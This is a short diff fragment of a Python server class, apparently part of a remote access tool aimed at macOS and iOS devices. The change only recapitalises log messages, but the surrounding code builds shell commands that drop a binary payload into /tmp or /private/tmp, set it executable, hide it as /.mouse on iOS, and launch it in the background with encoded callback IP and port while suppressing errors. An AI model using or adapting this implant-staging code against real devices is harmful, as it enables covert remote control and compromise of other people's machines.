@@ -128,7 +128,7 @@ class Server:
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
             self.verbose_print("Connecting to macOS...")
-            self.verbose_print("Sending macOS Payload...")
+            self.verbose_print("Sending macOS payload...")
             f = open("data/payloads/macos", "rb")
             payload = f.read()
             f.close()
@@ -137,11 +137,11 @@ class Server:
             "cat >/private/tmp/mouse;"+\
             "chmod 777 /private/tmp/mouse;"+\
             "/private/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
-            self.verbose_print("Executing macOS Payload...")
+            self.verbose_print("Executing macOS payload...")
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
             self.verbose_print("Connecting to iOS...")
-            self.verbose_print("Sending iOS Payload...")
+            self.verbose_print("Sending iOS payload...")
             f = open("data/payloads/ios", "rb")
             payload = f.read()
             f.close()
@@ -150,7 +150,7 @@ class Server:
             "chmod 777 /tmp/mouse;"+\
             "mv /tmp/mouse /.mouse;"+\
             "/.mouse "+payload_parameter+" 2>/dev/null &\n"
-            self.verbose_print("Executing iOS Payload...") 
+            self.verbose_print("Executing iOS payload...") 
             return (instructions,payload)
         else:
             h.info_error("The device is not recognized!")
